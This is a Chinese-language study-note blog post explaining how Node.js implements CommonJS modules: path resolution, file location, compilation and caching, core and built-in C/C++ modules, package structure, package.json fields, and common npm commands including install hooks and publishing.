<p>对应引入的功能，上下文提供了exports对象用于导出当前模块的方法或者变量，并且它是唯一导出的出口。module对象代表模块自身，而exports是module的属性。在node中，一个文件就是一个模块，将方法挂载在exports对象上作为属性即可定义导出的方式:<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// math.js</span></span><br><span class="line">exports.add = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> sum = <span class="number">0</span>,</span><br><span class="line">      i   = <span class="number">0</span>,</span><br><span class="line">      args = <span class="built_in">arguments</span>,</span><br><span class="line">      l = args.length;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">while</span> (i &lt; l) &#123;</span><br><span class="line">    sum += args[i++];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sum;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// program.js</span></span><br><span class="line"><span class="keyword">var</span> math = <span class="built_in">require</span>(<span class="string">'./math'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(math.add(<span class="number">1</span>, <span class="number">2</span>));<span class="comment">// 3</span></span><br></pre></td></tr></table></figure></p>
<p>3.模块标识</p>
<p>模块标识其实就是传递给require()方法的参数，它必须是符合小驼峰命名的字符串，或者以.、..开头的相对路径，或者绝对路径。可以没有文件名后缀.js。</p>
<p>模块的意义在于将类聚的方法和变量等限定在私有的作用域中，同时支持引入和导出功能以顺畅地连接上下游依赖。</p>
<h2 id="node的模块实现"><a href="#node的模块实现" class="headerlink" title="node的模块实现"></a>node的模块实现</h2><p>Node在实现中并非完全按照规范实现。</p>
<p>在node中引入模块，需要经历3个步骤。</p>
<ol>
<li>路径分析</li>
<li>文件定位</li>
<li>编译执行</li>
</ol>
<p>在node中，模块分为两类:一类是node提供的模块，称为核心模块；另一类是用户编写的模块，称为文件模块。</p>
<ol>
<li>核心模块部分在node源代码的编译过程中，编译进了二进制执行文件。在node进程启动时，部分核心模块就被直接加载进内存中，所以这部分核心模块引入时，文件定位和编译执行这两个步骤可以省略掉，并且在路径分析中优先判断，所以它的加载速度是最快的。</li>
<li>文件模块则是在运行时动态加载，需要完整的路径分析、文件定位、编译执行过程，速度比核心模块慢。</li>
</ol>
<p>接下来，我们展开详细的模块加载过程。</p>
<p>1.优先从缓存加载</p>
<p>node对引入过的模块都会进行缓存，以减少二次引入时的开销。与浏览器仅仅缓存文件不同，node缓存的是编译和执行之后的对象。</p>
<p>无论是核心模块还是文件模块，require()方法对相同模块的二次加载都一律采用缓存优先的方式，这是第一优先级的，核心模块的缓存检查先于文件模块的缓存检查。</p>
<p>2.路径分析和文件定位</p>
<p>2.1模块标识符分析</p>
<p>require()方法接受一个标识符作为参数，node正是基于这样一个标识符进行模块查找的。模块标识符在node中主要分为几类。</p>
<ol>
<li>核心模块，如http、fs、path等</li>
<li>以.或..开始的相对路径文件模块</li>
<li>以/开始的绝对路径文件模块</li>
<li><p>非路径形式的文件模块，如自定义的connect模块</p>
</li>
<li><p>核心模块<br>核心模块的优先级仅次于缓存加载，它在node的源代码编译过程中已经编译为二进制文件代码，其加载过程最快。</p>
</li>
<li><p>路径形式的文件模块<br>以.、..和/开始的标识符，这里都被当做文件模块来处理。在分析路径模块时，require()方法会将路径转为真实路径，并以真实路径作为索引，将编译执行后的结果存放到缓存中，以使二次加载时更快。由于文件模块给node指明了确切的文件位置，所以在查找过程中可以节约大量时间，其加载速度慢于核心模块。</p>
</li>
<li><p>自定义模块<br>自定义模块指的是非核心模块，也不是路径形式的标识符。它是一种特殊的文件模块，可能是一个文件或者包的形式。这类模块的查找是最费时的，也是所有方式中最慢的一种。</p>
</li>
</ol>
<p>我们需要先介绍一下模块路径这个概念。模块路径是node在定位文件模块的具体文件时制定的查找策略，具体表现为一个路径组成的数组。关于这个路径的生成规则，我们可以手动尝试一番。</p>
<p>(1)创建module_path.js文件，其内容为console.log(module.paths);<br>(2)将其放在任意一个目录中然后执行node module_path.js</p>
<p>在Linux下，你可能得到的是这样一个数组输出:<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[<span class="string">'/home/jackson/research/node_modules'</span>,</span><br><span class="line"><span class="string">'/home/jackson/node_modules'</span>,</span><br><span class="line"><span class="string">'/home/node_modules'</span>,</span><br><span class="line"><span class="string">'/node_modules'</span>]</span><br></pre></td></tr></table></figure></p>
<p>在window下，也许是这样：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[<span class="string">'c:\\nodejs\\node_modules'</span>, <span class="string">'c:\\node_modules'</span>]</span><br></pre></td></tr></table></figure></p>
<p>可以看出，模块路径的生成规则如下所示。<br>1.当前文件目录下的node_modules目录<br>2.父目录下的node_modules目录<br>3.父目录的父目录下的node_modules目录<br>4.沿路径向上逐级递归，直到根目录下的node_modules目录<br>在加载过程中，node会逐个尝试模块路径中的路径，直到找到目标文件为止。当前文件路径越深，模块查找耗时越多，这是自定义模块的加载速度最慢的原因。</p>
<p>2.1文件定位</p>
<p>从缓存加载的优化策略使得二次引入时不需要路径分析、文件定位和编译执行的过程，大大提高了再次加载模块的效率。</p>
<p>但在文件定位过程中，还有一些细节需要注意，这主要包括文件拓展名的分析、目录和包的处理。<br>2.1.1文件扩展名分析<br>CommonJS模块规范允许在标识符中不包含文件扩展名，这种情况下node会按.js、.json、.node的次序补足扩展名，依次尝试。在尝试过程中，需要调用fs模块同步阻塞式判断文件是否存在。因为node是单线程，这里是一个会引起性能问题的地方。小诀窍是：标识符带上扩展名，这样会加快一点速度。另一个诀窍是：同步配合缓存，也可以大幅度缓解Node单线程阻塞式调用的缺陷。</p>
<p>2.1.2目录分析和包</p>
<p>在分析标识符的过程中，require()通过分析拓展名之后，可能没有查找到对应文件，但却得到一个目录，此时Node会将目录当做一个包来处理。</p>
<p>Node会在当前目录下查找package.json（包描述文件），通过JSON.parse()解析包描述对象，从中取出main属性指定的文件名进行定位。如果文件名缺少扩展名，将会进入扩展名分析的步骤。而如果main属性指定的文件名错误，或者压根没有package.json文件，node会将index当做默认文件名，然后依次查找index.js、index.json、index.node。</p>
<p>如果没有定位成功，则自定义模块进入下一个模块路径进行查找。如果模块路径数组都被遍历完毕，依旧没有查找到，则会抛出查找失败的异常。</p>
<h2 id="模块编译"><a href="#模块编译" class="headerlink" title="模块编译"></a>模块编译</h2><p>在Node中，每个文件模块都是一个对象,它的定义如下<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Module</span>(<span class="params">id, parent</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.id = id;</span><br><span class="line">  <span class="keyword">this</span>.exports = &#123;&#125;;</span><br><span class="line">  <span class="keyword">this</span>.parent = parent;</span><br><span class="line">  <span class="keyword">if</span> (parent &amp;&amp; parent.children) &#123;</span><br><span class="line">    parent.children.push(<span class="keyword">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">this</span>.filename = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">this</span>.loaded = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">this</span>.children = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>定位到具体的文件后，Node会新建一个模块对象，然后根据路径载入并编译。对于不同的文件扩展名，其载入方法也有所不同。</p>
<ol>
<li>.js文件 通过fs模块同步读取文件后编译执行</li>
<li>.node文件 这是C/C++编写的扩展文件，通过dlopen()方法加载最后编译生成的文件</li>
<li>.json文件 通过fs模块同步读取文件后，用JSON.parse()解析返回结果</li>
<li>其余扩展名文件 都被当做.js文件载入<br>每一个编译成功的模块都会将其文件路径作为索引缓存在Module._cache对象上，以提高二次引入的性能<br>.json文件的调用如下：<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Native extension for .json</span></span><br><span class="line">Module._extensions[<span class="string">'.json'</span>] = <span class="function"><span class="keyword">function</span>(<span class="params">module, filename</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> content = NativeModule.require(<span class="string">'fs'</span>).readFileSync(filename, <span class="string">'utf8'</span>);</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="built_in">module</span>.exports = <span class="built_in">JSON</span>.parse(stripBOM(content));</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    err.message = filename + <span class="string">':'</span> + err.message;</span><br><span class="line">    <span class="keyword">throw</span> err;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>其中，Module._extensions会被赋值给require()的extensions属性，所以访问require.extensions可以知道系统中已有的扩展加载方式：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">require</span>.extensions);</span><br></pre></td></tr></table></figure></p>
<p>结果如下：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="built_in">Object</span>: <span class="literal">null</span> prototype] &#123; <span class="string">'.js'</span>: [<span class="built_in">Function</span>], <span class="string">'.json'</span>: [<span class="built_in">Function</span>], <span class="string">'.node'</span>: [<span class="built_in">Function</span>] &#125;</span><br></pre></td></tr></table></figure></p>
<p>如果想对自定义的扩展名进行特殊的加载，可以通过类似require.extensions[‘.ext’]的方式实现。早期的CoffeeScript文件就是通过添加require.extensions[‘.coffee’]扩展的方式来实现加载的。但是从V0.10.6开始，官方不鼓励通过这种方式进行加载，而是期望先将其他语言或文件编译成JavaScript文件后再加载，这样做的好处在于不将烦琐的编译加载等过程引入Node的执行过程中。</p>
<p>在确定文件的扩展名之后，Node将调用具体的编译方式来将文件执行后返回给调用者。<br>1.javaScript模块的编译<br>每个模块文件都有exports、require、、module、<strong>filename、</strong>dirname这些变量存在<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">'0'</span>: &#123;&#125;,</span><br><span class="line">  <span class="string">'1'</span>:</span><br><span class="line">   &#123; [<span class="built_in">Function</span>: <span class="built_in">require</span>]</span><br><span class="line">     resolve: &#123; [<span class="built_in">Function</span>: resolve] paths: [<span class="built_in">Function</span>: paths] &#125;,</span><br><span class="line">     main:</span><br><span class="line">      Module &#123;</span><br><span class="line">        id: <span class="string">'.'</span>,</span><br><span class="line">        exports: &#123;&#125;,</span><br><span class="line">        parent: <span class="literal">null</span>,</span><br><span class="line">        filename: <span class="string">'/Users/jiangchaofei/Desktop/study/node-test/module_path.js'</span>,</span><br><span class="line">        loaded: <span class="literal">false</span>,</span><br><span class="line">        children: [],</span><br><span class="line">        paths: [<span class="built_in">Array</span>] &#125;,</span><br><span class="line">     extensions:</span><br><span class="line">      [<span class="built_in">Object</span>: <span class="literal">null</span> prototype] &#123; <span class="string">'.js'</span>: [<span class="built_in">Function</span>], <span class="string">'.json'</span>: [<span class="built_in">Function</span>], <span class="string">'.node'</span>: [<span class="built_in">Function</span>] &#125;,</span><br><span class="line">     cache:</span><br><span class="line">      [<span class="built_in">Object</span>: <span class="literal">null</span> prototype] &#123;</span><br><span class="line">        <span class="string">'/Users/jiangchaofei/Desktop/study/node-test/module_path.js'</span>: [Module] &#125; &#125;,</span><br><span class="line">  <span class="string">'2'</span>:</span><br><span class="line">   Module &#123;</span><br><span class="line">     id: <span class="string">'.'</span>,</span><br><span class="line">     exports: &#123;&#125;,</span><br><span class="line">     parent: <span class="literal">null</span>,</span><br><span class="line">     filename: <span class="string">'/Users/jiangchaofei/Desktop/study/node-test/module_path.js'</span>,</span><br><span class="line">     loaded: <span class="literal">false</span>,</span><br><span class="line">     children: [],</span><br><span class="line">     paths:</span><br><span class="line">      [ <span class="string">'/Users/jiangchaofei/Desktop/study/node-test/node_modules'</span>,</span><br><span class="line">        <span class="string">'/Users/jiangchaofei/Desktop/study/node_modules'</span>,</span><br><span class="line">        <span class="string">'/Users/jiangchaofei/Desktop/node_modules'</span>,</span><br><span class="line">        <span class="string">'/Users/jiangchaofei/node_modules'</span>,</span><br><span class="line">        <span class="string">'/Users/node_modules'</span>,</span><br><span class="line">        <span class="string">'/node_modules'</span> ] &#125;,</span><br><span class="line">  <span class="string">'3'</span>: <span class="string">'/Users/jiangchaofei/Desktop/study/node-test/module_path.js'</span>,</span><br><span class="line">  <span class="string">'4'</span>: <span class="string">'/Users/jiangchaofei/Desktop/study/node-test'</span> &#125;</span><br></pre></td></tr></table></figure></p>
<p>在编译的过程中，Node对获取的JavaScript文件内容进行了头尾包装。在头部添加了:<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">exports, require, module, __filename, __dirname</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> content = <span class="string">"content"</span>;</span><br><span class="line">  exports.content = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(content);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>这样每个模块文件之前都进行了作用域隔离。包装之后的代码会通过vm原生模块的runInThisContext()方法执行(类似eval，只是具有明确上下文，不污染全局)，返回一个具体的function对象。最后，将当前模块对象的exports属性、require方法、module（模块对象自身），以及在文件定位中得到的完整文件路径和文件目录作为参数传递给这个function()执行.</p>
<p>在执行之后，模块的exports属性被返回给了调用方。exports属性上的任何方法和属性都可以被外部调用到。但模块中的其余变量或属性则不可直接被调用。</p>
<p>那么存在exports的情况下，为何存在module.exports.理想情况下，只要赋值给exports即可<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">exports = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// My Class</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>但是会得到一个失败的结果。原因是，exports对象是通过形参的方式传入的，直接赋值形参会改变形参的引用，但并不能改变作用域外的值，测试代码如下：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> change = <span class="function"><span class="keyword">function</span> (<span class="params">exp</span>) </span>&#123;</span><br><span class="line">  exp = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// My Class</span></span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="built_in">console</span>.log(exp);<span class="comment">// [Function: exp]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> exp = &#123;&#125;;</span><br><span class="line">change(exp);</span><br><span class="line"><span class="built_in">console</span>.log(exp);<span class="comment">// &#123;&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>如果要达到require引入一个类的效果，请赋值给module.exports对象。这个迂回的方案不改变形参的引用。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// a.js</span></span><br><span class="line"><span class="comment">// exports = function () &#123;&#125;;</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// b.js</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">'./a.js'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(a);<span class="comment">// [Function]</span></span><br></pre></td></tr></table></figure>
<p>2.C/C++模块的编译<br>Node调用process.dlopen()方法进行加载和执行。在Node的架构下，dlopen()方法在Windows和*nix平台下分别有不同的实现，通过libuv兼容层进行了封装。<br>实际上，.node的模块文件并不需要编译，因为它是编写C/C++模块之后编译生成的，所有这里只有加载和执行的过程。在执行的过程中，模块的exports对象与.node模块产生联系，然后返回给调用者。</p>
<p>3.JSON文件的编译<br>Node利用fs模块同步读取JSON文件的内容之后，调用JSON.parse方法得到对象，然后将它赋给模块对象的exports,以供外部调用。</p>
<h2 id="核心模块"><a href="#核心模块" class="headerlink" title="核心模块"></a>核心模块</h2><p>Node的核心模块在编译成可执行文件的过程中被编译进了二进制文件。核心模块分为C/C++模块和JavaScript编写的两部分</p>
<ol>
<li>JavaScript核心模块的编译过程</li>
</ol>
<p>在编译所有C/C++文件之前，编译程序需要将所有的JavaScript模块文件编译为C/C++代码。<br>1.1转存为C/C++代码<br>Node采用了V8附带的js2c.py工具，将内置的JavaScript代码转换成C++里的数组，生成node_natives.h头文件<br><img src="https://mfaying.github.io/static/images/node/7.jpg" alt="avatar"><br>JavaScript代码以字符串的形式存储在node命名空间中，是不可直接执行的。在启动Node进程时，JavaScript代码直接加载进内存中。在加载的过程中，JavaScript核心模块经历标识符分析后直接定位到内存中，比普通的文件模块从磁盘中一处一处查找要快很多。<br>2.编译JavaScript核心模块<br>在引入JavaScript核心模块的过程中，也经历了头尾包装的过程，然后才执行和导出了exports对象。与文件模块有区别的地方在于：获取源代码的方式（核心模块是从内存中加载的）以及缓存执行结果的位置。<br>JavaScript核心模块的定义如下，源文件通过process.binding(‘natives’)取出，编译成功的模块缓存到NativeModule._cache对象上，文件模块则缓存到Module._cache对象上：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">NativeModule</span>(<span class="params">id</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.filename = id + <span class="string">'.js'</span>;</span><br><span class="line">  <span class="keyword">this</span>.id = id;</span><br><span class="line">  <span class="keyword">this</span>.exports = &#123;&#125;;</span><br><span class="line">  <span class="keyword">this</span>.loaded = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">NativeModule._source = process.binding(<span class="string">'natives'</span>);</span><br><span class="line">NativeModule._cache = &#123;&#125;;</span><br></pre></td></tr></table></figure></p>
<h2 id="C-C-核心模块的编译过程"><a href="#C-C-核心模块的编译过程" class="headerlink" title="C/C++核心模块的编译过程"></a>C/C++核心模块的编译过程</h2><p>在核心模块中，有些模块全部由C/C++编写，有些模块则由C/C++完成核心部分，其余部分则由JavaScript实现包装或由外导出，以满足性能需求。后面这种C++模块主内完成核心。JavaScript主外实现封装的模式是Node能够提高性能的常见方式。通常，脚本语言的开发速度优于静态语言，但是其性能则弱于静态语言。这种复合模式可以在开发速度和性能之间找到平衡点。</p>
<p>我们将那些由纯C/C++编写的部分称为内建模块，它们通常不被用户直接调用。Node的buffer、crypto、evals、fs、os等模块是部分通过C/C++编写的<br>1.内建模块的组织形式<br>内建模块的内部结构定义如下：<br><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node_module_struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> version;</span><br><span class="line">  <span class="keyword">void</span> *dso_handle;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *filename;</span><br><span class="line">  <span class="keyword">void</span> (*register_func) (v8::Handle&lt;v8::Object&gt; target);</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *modname;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>每一个内建模块在定义之后，都通过NODE_MODULE宏将模块定义到node命名空间中，模块的具体初始化方法挂载为结构的register_func成员<br><img src="https://mfaying.github.io/static/images/node/8.jpg" alt="avatar"><br>node_extensions.h文件将这些散列的内建模块统一放进了一个叫node_module_list的数组中，这些模块有：<br><img src="https://mfaying.github.io/static/images/node/9.jpg" alt="avatar"><br>Node提供了get_builtin_module()方法从node_module_list数组中取出这些模块。<br>内建模块的优势在于：性能上优于脚本语言；其次，在进行文件编译时，它们被编译进二进制文件。一旦Node开始执行，它们被直接加载进内存中，无需再次做标识符定位、文件定位、编译等过程，直接就可执行。</p>
<p>2.内建模块的导出<br>在Node的所有模块类型中，存在一种依赖层级关系，即文件模块可能会依赖核心模块、核心模块可能会依赖内建模块</p>
<p>不推荐文件模块直接调用内建模块。如需调用，直接调用核心模块即可，因为核心模块中基本都封装了内建模块。那么内建模块是如何将内部变量或方法导出，以供外部JavaScript核心模块调用的呢？</p>
<p>Node在启动时，会生成一个全局变量process，并提供Binding()方法来协助加载内建模块。</p>
<p>在加载内建模块是，我们先创建一个exports空对象，然后调用get_builtin_module()方法取出内建模块对象，通过执行register_func()填充exports对象，最后将exports对象按模块名缓存，并返回给调用方完成导出。</p>
<p>这个方法不仅可以导出内建方法，还能导出一些别的内容。前面提到的JavaScript核心文件被转换为C/C++数组存储后，便是通过process.binding(‘natives’)取出放置在NativeModule._source中的：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NativeModule._source = process.binding(&apos;natives&apos;);</span><br></pre></td></tr></table></figure></p>
<p>该方法将通过js2c.py工具转换出的字符串数组取出，然后重新转换为普通字符串，以对JavaScript核心模块进行编译和执行。</p>
<h2 id="核心模块的引入流程"><a href="#核心模块的引入流程" class="headerlink" title="核心模块的引入流程"></a>核心模块的引入流程</h2><p>os原生模块的引入流程如下图所示，为了符合CommonJS模块规范，从JavaScript到C/C++的过程是相当复杂的，它要经历C/C++层面的内建模块定义、（JavaScript）核心模块定义和引入以及（JavaScript）文件模块层面的引入。对于用户而言，require()十分简洁。<br><img src="https://mfaying.github.io/static/images/node/10.jpg" alt="avatar"></p>
<h2 id="编写核心模块（-暂略）"><a href="#编写核心模块（-暂略）" class="headerlink" title="编写核心模块（???暂略）"></a>编写核心模块（???暂略）</h2><h2 id="模块调用栈"><a href="#模块调用栈" class="headerlink" title="模块调用栈"></a>模块调用栈</h2><p>下面明确一下各种模块之间的调用关系<br>C/C++内建模块属于最底层的模块，它属于核心模块，主要提供API给JavaScript核心模块和第三方JavaScript模块调用。如果你不是非常了解要调用的C/C++模块，请尽量避免通过process.binding()方法直接调用，这是不推荐的。<br>JavaScript核心模块主要扮演的职责有两类：一类是作为C/C++内建模块的封装层和桥接层，供文件模块调用；一类是纯粹的功能模块，它不需要跟底层打交道，但是又十分重要。<br><img src="https://mfaying.github.io/static/images/node/11.jpg" alt="avatar"><br>文件模块通常是由第三方编写，包括普通JavaScript模块和C/C++扩展模块，主要调用方向为普通JavaScript模块调用扩展模块。</p>
<h2 id="包与NPM"><a href="#包与NPM" class="headerlink" title="包与NPM"></a>包与NPM</h2><p>包和NPM是将模块联系起来的一种机制。<br>Node对CommomJS模块规范的实现，一定程度上解决了变量依赖、依赖关系等代码组织性问题，它也对CommomJS的包规范做了实现，在模块的基础上进一步组织JavaScript代码。<br><img src="https://mfaying.github.io/static/images/node/12.jpg" alt="avatar"></p>
<p>它由包结构和包描述文件组成，前者用于组织包中的各种文件，后者则用于描述包的相关信息，以供外部读取分析。</p>
<h2 id="包结构"><a href="#包结构" class="headerlink" title="包结构"></a>包结构</h2><p>包实际上是一个存档文件，即一个目录直接打包为.zip或tar.gz格式的文件，安装后解压还原为目录。完全符合CommonJS规范的包目录包含以下文件：</p>
<ol>
<li>packages.json: 包描述文件</li>
<li>bin: 用于存放可执行二进制文件的目录</li>
<li>lib: 用于存放JavaScript代码的目录</li>
<li>doc: 用于存放文档的目录</li>
<li>test: 用于存放单元测试用例的代码</li>
</ol>
<h2 id="包描述文件与NPM"><a href="#包描述文件与NPM" class="headerlink" title="包描述文件与NPM"></a>包描述文件与NPM</h2><p>包描述文件是一个JSON格式的文件——package.json,位于包的根目录下。</p>
<p>package.json文件的必要字段：</p>
<ol>
<li>name 包名。包名必须是唯一的，以免对外公布时产生重名冲突的误解。</li>
<li>description 包简介</li>
<li>version 版本号。通茶为major.minor.version</li>
<li>keywords 关键词数组。NPM中主要用来做分类搜索。</li>
<li>maintainers 包维护者列表。NPM通过该属性进行权限认证。</li>
<li>contributors 贡献者列表</li>
<li>bugs 一个可以反馈bug的网页地址或邮件地址<br><img src="https://mfaying.github.io/static/images/node/13.jpg" alt="avatar"><br>包规范的定义可以帮助Node解决依赖包安装的问题，而NPM正是基于该规范进行了实现。在v0.6.3版本时集成进Node中作为默认包管理器。</li>
</ol>
<p>在包描述文件的规范中，NPM实际需要的字段主要有name、version、description、keywords、repositorier、author、bin、main、script、engines、dependencies、devDependencies<br>与包规范的区别多了author、bin、main和devDependencies</p>
<ol>
<li>author 包作者</li>
<li>bin 一些包作者希望包可以作为命令行工具使用。配置好bin字段后，通过npm install package_name -g命令可以将脚本添加到执行路径中，之后可以在命令行中直接执行。通过-g命令安装的模块包称为全局模式</li>
<li>main 模块引入方法require()在引入包时，会优先检查这个字段，并将其作为包中其余模块的入口。如果不存在这个字段，会查找包目录下的index.js、index.node、index.json文件作为默认入口</li>
<li>devDependencies 开发时需要的依赖</li>
</ol>
<h2 id="NPM常用功能"><a href="#NPM常用功能" class="headerlink" title="NPM常用功能"></a>NPM常用功能</h2><p>NPM帮助Node完成了第三方模块的发布、安装和依赖等。借助NPM、Node与第三方模块之间形成了很好地一个生态系统。</p>
<p>下面介绍一些npm的用法</p>
<ol>
<li><p>查看npm版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm -v</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装依赖包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install express</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>npm会在当前目录下创建node_modules,然后在node_modules下创建express,接着将包解压到这个目录下。<br>require()方法在做路径分析的时候会通过模块路径查找到express所在的位置。</p>
<ol start="3">
<li>全局模式安装<br>如果包中含有命令行工具，那么需要执行npm install express -g命令进行全局安装。全局模式并不是将一个模块包安装为一个全局包的意思，它并不意味着可以从任何地方通过require()来引用它。<br>它根据包描述文件中的bin字段配置，将实际脚本链接到与Node可执行文件相同的路径下：<figure class="highlight"><table><tr><td class="code"><pre><span class="line">"bin": &#123;</span><br><span class="line">  "express": "./bin/express"</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>事实上，通过全局模式安装的所有模块的包都被安装进了一个统一的目录下，这个目录可以通过如下方式推算出来：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">path.resolve(process.execPath, &apos;..&apos;, &apos;..&apos;, &apos;lib&apos;, &apos;node_modules&apos;);</span><br></pre></td></tr></table></figure></p>
<p>如果Node可执行文件的位置是/usr/local/bin/node，那么模块目录就是/usr/local/lib/node_modules,最后通过软连接的方式将bin字段配置的可执行文件链接到Node的可执行目录下。</p>
<ol start="4">
<li>从本地安装<br>本地安装只需为NPM指明package.json文件所在位置即可：它可以是一个包含package.json的存档文件，也可以是一个url地址，也可以是一个目录下有package.json文件的目录位置。具体参数如下：<br>npm install <tarball file><br>npm install <tarball url><br>npm install <folder></folder></tarball></tarball></li>
<li>从非官方源安装<br>通过镜像源安装。在执行命令时,添加–registry=<a href="http://registry.url" target="_blank" rel="noopener">http://registry.url</a><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install underscore --registry=http://registry.url</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>如果使用过程中几乎都采用镜像源安装，可以执行以下命令指定默认源：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm config set registry http://registry.url</span><br></pre></td></tr></table></figure></p>
<h2 id="NPM钩子命令"><a href="#NPM钩子命令" class="headerlink" title="NPM钩子命令"></a>NPM钩子命令</h2><p>script字段的提出就是让包在安装或者卸载等过程中提供钩子机制：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">"script": &#123;</span><br><span class="line">  "preinstall": "preinstall.js",</span><br><span class="line">  "install": "install.js",</span><br><span class="line">  "uninstall": "uninstall.js",</span><br><span class="line">  "test": "test.js"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在以上字段中执行npm install <code>&lt;package&gt;</code>，preinstall指向的脚本将会被加载执行，然后install指向的脚本会被执行。</p>
<h2 id="发布包"><a href="#发布包" class="headerlink" title="发布包"></a>发布包</h2><p>为了将整个NPM的流程串联起来，这里演示如何编写一个包，将其发布到NPM仓库中，并通过NPM安装回本地。</p>
<p>1.编写模块<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hello.js</span></span><br><span class="line">exports.sayHello = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Hello, world.'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>2.初始化包描述文件<br>npm init可以帮助你生成package.json文件<br>3.注册包仓库账号<br>注册账号的命令是npm adduser<br>4.上传包<br>npm publish <code>&lt;folder&gt;</code><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm publish .</span><br></pre></td></tr></table></figure></p>
<p>在这个过程中，npm会将目录打包为一个存档文件，然后上传到官方源仓库中。<br>5.安装包<br>npm install hell_test_jackson<br>6.包管理权限<br>通常，一个包只有一个人拥有权限进行发布，如果需要多人进行发布，可以使用npm owner命令帮助你管理包的所有者。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm owner ls eventproxy</span><br><span class="line">npm http GET https://registry.npmjs.org/eventproxy</span><br><span class="line">npm http 200 https://registry.npmjs.org/eventproxy</span><br><span class="line">jacksontian &lt;shyvo1987@gmail.com&gt;</span><br></pre></td></tr></table></figure></p>
<p>可以添加包的拥有者，删除一个包的拥有者：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm owner ls &lt;package name&gt;</span><br><span class="line">npm owner add &lt;user&gt; &lt;package name&gt;</span><br><span class="line">npm owner rm &lt;user&gt; &lt;package name&gt;</span><br></pre></td></tr></table></figure></p>
<p>7.分析包<br>npm ls可以分析出当前路径下能够通过模块路径找到的所有包，并生成依赖树<br><img src="https://mfaying.github.io/static/images/node/14.jpg" alt="avatar"></p>
